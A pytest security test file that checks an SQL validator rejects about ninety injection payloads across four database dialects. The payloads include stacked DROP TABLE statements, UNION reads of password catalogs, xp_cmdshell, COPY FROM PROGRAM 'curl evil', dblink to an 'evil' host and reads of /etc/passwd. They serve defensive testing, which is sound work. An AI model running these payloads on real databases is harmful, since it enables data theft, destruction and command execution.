"""SQL injection / exfiltration / abuse payloads must never pass the SQL validator.

Each payload is validated against a realistic policy (approved reporting view,
approved columns, mandatory tenant predicate). Every one must raise
``SqlSafetyError``; where the expected reason is unambiguous it is asserted too.
"""

from __future__ import annotations

import pytest

from app.query.sql_validator import SqlPolicy, SqlSafetyError, validate_sql

pytestmark = pytest.mark.security

T = "analytics.analytics_sales_orders"
OK = f"SELECT region_name, sum(net_amount) AS total FROM {T} WHERE tenant_code = $1"


def policy(dialect: str) -> SqlPolicy:
    return SqlPolicy(
        dialect=dialect,
        allowed_tables=frozenset({T, "analytics_customers"}),
        allowed_columns=frozenset(
            {"region_name", "net_amount", "order_date", "tenant_code", "customer_id"}
        ),
        required_equality_columns=frozenset({"tenant_code"}),
        max_limit=1000,
    )


# (dialect, payload, expected reason or None when several reasons are acceptable)
ATTACKS: list[tuple[str, str, str | None]] = [
    # --- stacked queries
    ("postgresql", f"{OK} GROUP BY region_name LIMIT 5; DROP TABLE users", "MULTIPLE_STATEMENTS"),
    ("postgresql", f"{OK} GROUP BY region_name LIMIT 5;DELETE FROM {T}", "MULTIPLE_STATEMENTS"),
    (
        "sqlite",
        "SELECT region_name FROM analytics_sales_orders WHERE tenant_code = ? LIMIT 5;\nATTACH DATABASE '/tmp/x.db' AS x",
        "MULTIPLE_STATEMENTS",
    ),
    (
        "sqlserver",
        f"SELECT TOP 5 region_name FROM {T} WHERE tenant_code = :t; EXEC xp_cmdshell 'whoami'",
        "MULTIPLE_STATEMENTS",
    ),
    # --- comment tricks
    ("postgresql", f"{OK} --' AND 1=0\n GROUP BY region_name LIMIT 5", "COMMENT"),
    ("postgresql", f"SELECT region_name/**/FROM {T} WHERE tenant_code = $1 LIMIT 5", "COMMENT"),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 /* OR 1=1 */ LIMIT 5",
        "COMMENT",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 /* /* nested */ */ LIMIT 5",
        "COMMENT",
    ),
    ("mysql", f"SELECT region_name FROM {T} WHERE tenant_code = %s # trailing", "COMMENT"),
    (
        "mysql",
        f"SELECT region_name FROM {T} WHERE tenant_code = %s /*!50000 UNION SELECT 1 */ LIMIT 5",
        "COMMENT",
    ),
    # --- UNION exfiltration
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 UNION SELECT passwd FROM pg_shadow LIMIT 5",
        None,
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 UNION ALL SELECT usename FROM pg_catalog.pg_user LIMIT 5",
        None,
    ),
    (
        "sqlite",
        "SELECT region_name FROM analytics_sales_orders WHERE tenant_code = ? UNION SELECT sql FROM sqlite_master LIMIT 5",
        None,
    ),
    (
        "mysql",
        f"SELECT region_name FROM {T} WHERE tenant_code = ? UNION SELECT table_name FROM information_schema.tables LIMIT 5",
        None,
    ),
    (
        "postgresql",
        "SELECT table_name FROM information_schema.tables WHERE tenant_code = $1 LIMIT 5",
        "SYSTEM_CATALOG",
    ),
    ("postgresql", "SELECT relname FROM pg_class WHERE tenant_code = $1 LIMIT 5", "SYSTEM_CATALOG"),
    ("sqlite", "SELECT name FROM sqlite_schema WHERE tenant_code = ? LIMIT 5", "SYSTEM_CATALOG"),
    ("sqlserver", "SELECT TOP 5 name FROM sys.objects WHERE tenant_code = :t", "SYSTEM_CATALOG"),
    ("mysql", "SELECT user FROM mysql.user WHERE tenant_code = ? LIMIT 5", "SYSTEM_CATALOG"),
    # --- blind / time-based
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 AND pg_sleep(5) IS NULL LIMIT 5",
        "FUNCTION_NOT_ALLOWED",
    ),
    (
        "postgresql",
        f"SELECT CASE WHEN 1=1 THEN pg_sleep(5) END AS x FROM {T} WHERE tenant_code = $1 LIMIT 5",
        "FUNCTION_NOT_ALLOWED",
    ),
    (
        "sqlite",
        "SELECT region_name FROM analytics_sales_orders WHERE tenant_code = ? AND randomblob(1000000000) IS NOT NULL LIMIT 5",
        "FUNCTION_NOT_ALLOWED",
    ),
    (
        "mysql",
        f"SELECT region_name FROM {T} WHERE tenant_code = ? AND SLEEP(5) = 0 LIMIT 5",
        "FUNCTION_NOT_ALLOWED",
    ),
    (
        "mysql",
        f"SELECT region_name FROM {T} WHERE tenant_code = ? AND BENCHMARK(10000000, MD5('a')) = 0 LIMIT 5",
        "FUNCTION_NOT_ALLOWED",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 AND (SELECT count(1) FROM pg_user) > 0 LIMIT 5",
        None,
    ),
    # --- dangerous functions
    (
        "postgresql",
        f"SELECT pg_read_file('/etc/passwd') AS f FROM {T} WHERE tenant_code = $1 LIMIT 5",
        "FUNCTION_NOT_ALLOWED",
    ),
    (
        "postgresql",
        f"SELECT current_setting('is_superuser') AS s FROM {T} WHERE tenant_code = $1 LIMIT 5",
        "FUNCTION_NOT_ALLOWED",
    ),
    (
        "postgresql",
        f"SELECT set_config('default_transaction_read_only', 'off', false) AS s FROM {T} WHERE tenant_code = $1 LIMIT 5",
        "FUNCTION_NOT_ALLOWED",
    ),
    (
        "postgresql",
        f"SELECT lo_import('/etc/passwd') AS l FROM {T} WHERE tenant_code = $1 LIMIT 5",
        "FUNCTION_NOT_ALLOWED",
    ),
    (
        "postgresql",
        f"SELECT dblink('host=evil', 'select 1') AS d FROM {T} WHERE tenant_code = $1 LIMIT 5",
        "FUNCTION_NOT_ALLOWED",
    ),
    (
        "sqlite",
        "SELECT load_extension('/tmp/evil.so') AS e FROM analytics_sales_orders WHERE tenant_code = ? LIMIT 5",
        "FUNCTION_NOT_ALLOWED",
    ),
    # --- star
    ("postgresql", f"SELECT * FROM {T} WHERE tenant_code = $1 LIMIT 5", "STAR"),
    (
        "postgresql",
        f"SELECT analytics_sales_orders.* FROM {T} WHERE tenant_code = $1 LIMIT 5",
        "STAR",
    ),
    (
        "sqlite",
        "SELECT COUNT(*) AS n FROM analytics_sales_orders WHERE tenant_code = ? LIMIT 5",
        "STAR",
    ),
    # --- file / command execution / non-select
    ("postgresql", f"COPY (SELECT region_name FROM {T}) TO '/tmp/out.csv'", None),
    ("postgresql", "COPY analytics_sales_orders FROM PROGRAM 'curl evil'", None),
    (
        "mysql",
        f"SELECT region_name FROM {T} WHERE tenant_code = ? LIMIT 5 INTO OUTFILE '/tmp/x'",
        None,
    ),
    (
        "postgresql",
        f"SELECT region_name INTO TEMP stolen FROM {T} WHERE tenant_code = $1 LIMIT 5",
        "NOT_SELECT",
    ),
    ("sqlite", "ATTACH DATABASE '/tmp/evil.db' AS evil", "WRITE_OR_DDL"),
    ("sqlite", "PRAGMA writable_schema = 1", "WRITE_OR_DDL"),
    ("postgresql", "CALL refresh_all_materialized_views()", "WRITE_OR_DDL"),
    ("sqlserver", "EXEC xp_cmdshell 'net user'", "WRITE_OR_DDL"),
    ("postgresql", "DO $$ BEGIN PERFORM pg_sleep(10); END $$", None),
    ("postgresql", "SET default_transaction_read_only = off", "WRITE_OR_DDL"),
    ("postgresql", "BEGIN READ WRITE", None),
    ("postgresql", f"UPDATE {T} SET net_amount = 0 WHERE tenant_code = $1", "WRITE_OR_DDL"),
    ("postgresql", f"INSERT INTO {T} (region_name) VALUES ('x')", "WRITE_OR_DDL"),
    ("postgresql", f"TRUNCATE {T}", "WRITE_OR_DDL"),
    ("postgresql", "CREATE TABLE x AS SELECT 1", "WRITE_OR_DDL"),
    ("postgresql", "ALTER ROLE erp_readonly SUPERUSER", None),
    ("postgresql", "GRANT ALL ON ALL TABLES IN SCHEMA analytics TO public", None),
    (
        "postgresql",
        f"MERGE INTO {T} USING analytics_customers ON true WHEN MATCHED THEN DELETE",
        None,
    ),
    # --- writeable CTE / subqueries / table functions
    (
        "postgresql",
        f"WITH x AS (DELETE FROM {T} RETURNING region_name) SELECT region_name FROM x LIMIT 5",
        "WRITE_OR_DDL",
    ),
    (
        "postgresql",
        f"WITH x AS (SELECT region_name FROM {T}) SELECT region_name FROM x LIMIT 5",
        "NOT_SELECT",
    ),
    (
        "postgresql",
        "SELECT g FROM generate_series(1, 100000000) AS g WHERE tenant_code = $1 LIMIT 5",
        None,
    ),
    ("postgresql", "SELECT f FROM pg_ls_dir('/') AS f WHERE tenant_code = $1 LIMIT 5", None),
    (
        "postgresql",
        f"SELECT region_name FROM {T}, LATERAL (SELECT 1) AS l WHERE tenant_code = $1 LIMIT 5",
        None,
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 AND customer_id IN (SELECT customer_id FROM analytics_customers) LIMIT 5",
        "SUBQUERY",
    ),
    (
        "postgresql",
        f"SELECT (SELECT max(net_amount) FROM {T}) AS m FROM {T} WHERE tenant_code = $1 LIMIT 5",
        "SUBQUERY",
    ),
    (
        "postgresql",
        "SELECT c FROM read_csv('/etc/passwd') AS c WHERE tenant_code = $1 LIMIT 5",
        None,
    ),
    # --- tenant filter bypass
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 OR 1 = 1 LIMIT 5",
        "MISSING_REQUIRED_FILTER",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE (tenant_code = $1 OR tenant_code IS NOT NULL) LIMIT 5",
        "MISSING_REQUIRED_FILTER",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE NOT (tenant_code = $1) LIMIT 5",
        "MISSING_REQUIRED_FILTER",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = tenant_code LIMIT 5",
        "MISSING_REQUIRED_FILTER",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = 'other-tenant' LIMIT 5",
        "MISSING_REQUIRED_FILTER",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code <> $1 LIMIT 5",
        "MISSING_REQUIRED_FILTER",
    ),
    ("postgresql", f"SELECT region_name FROM {T} LIMIT 5", "MISSING_REQUIRED_FILTER"),
    # --- joins
    (
        "postgresql",
        f"SELECT region_name FROM {T} CROSS JOIN analytics_customers WHERE tenant_code = $1 LIMIT 5",
        "CROSS_JOIN",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T}, analytics_customers WHERE tenant_code = $1 LIMIT 5",
        "CROSS_JOIN",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} JOIN payroll ON payroll.customer_id = analytics_sales_orders.customer_id WHERE tenant_code = $1 LIMIT 5",
        "TABLE_NOT_ALLOWED",
    ),
    # --- limits / locking / columns
    ("postgresql", f"SELECT region_name FROM {T} WHERE tenant_code = $1", "MISSING_LIMIT"),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 LIMIT 100000000",
        "LIMIT_TOO_HIGH",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 LIMIT 5 FOR UPDATE",
        "LOCKING",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 LIMIT 5 FOR SHARE",
        "LOCKING",
    ),
    (
        "postgresql",
        f"SELECT customer_bank_account FROM {T} WHERE tenant_code = $1 LIMIT 5",
        "COLUMN_NOT_ALLOWED",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 ORDER BY payment_token LIMIT 5",
        "COLUMN_NOT_ALLOWED",
    ),
    # --- unicode / quoting / case / whitespace obfuscation
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 LIMIT 5； DROP TABLE x",  # noqa: RUF001 - intentional unicode payload
        "PARSE_ERROR",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 OR 1=1 LIMIT 5",  # noqa: RUF001 - intentional unicode payload
        "PARSE_ERROR",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 AND region_name = 'x'' OR ''1''=''1' OR 1=1 LIMIT 5",
        "MISSING_REQUIRED_FILTER",
    ),
    (
        "mysql",
        f"SELECT region_name FROM {T} WHERE tenant_code = ? AND region_name = 'a\\' OR 1=1 LIMIT 5",
        None,
    ),
    (
        "postgresql",
        f"SeLeCt region_name FrOm {T} WhErE tenant_code = $1 UnIoN sElEcT passwd FrOm pg_shadow LiMiT 5",
        None,
    ),
    (
        "postgresql",
        f"SELECT\n\tregion_name\nFROM\n{T}\nWHERE\ntenant_code = $1\nLIMIT 5\n;\nDROP TABLE x",
        "MULTIPLE_STATEMENTS",
    ),
    (
        "postgresql",
        'SELECT region_name FROM "pg_catalog"."pg_authid" WHERE tenant_code = $1 LIMIT 5',
        "SYSTEM_CATALOG",
    ),
    (
        "postgresql",
        f"SELECT region_name FROM {T} WHERE tenant_code = $1 AND region_name = E'\\x27' LIMIT 5",
        None,
    ),
    (
        "sqlserver",
        "SELECT TOP 5 region_name FROM [sys].[tables] WHERE tenant_code = :t",
        "SYSTEM_CATALOG",
    ),
    ("postgresql", "SELECT 1", None),
    ("postgresql", "", "PARSE_ERROR"),
]


@pytest.mark.parametrize(
    ("dialect", "payload", "expected"),
    ATTACKS,
    ids=[f"{i:02d}-{a[0]}" for i, a in enumerate(ATTACKS)],
)
def test_attack_is_rejected(dialect: str, payload: str, expected: str | None) -> None:
    with pytest.raises(SqlSafetyError) as info:
        validate_sql(payload, policy(dialect))
    if expected is not None:
        assert info.value.details["reason"] == expected, info.value.details


def test_attack_corpus_is_large_enough() -> None:
    assert len(ATTACKS) >= 40


def test_rejection_details_never_echo_the_payload() -> None:
    payload = f"SELECT region_name FROM {T} WHERE tenant_code = $1 AND pg_sleep(5) IS NULL LIMIT 5"
    with pytest.raises(SqlSafetyError) as info:
        validate_sql(payload, policy("postgresql"))
    rendered = str(info.value.details) + info.value.message
    assert "pg_sleep(5)" not in rendered
    assert "SELECT" not in rendered
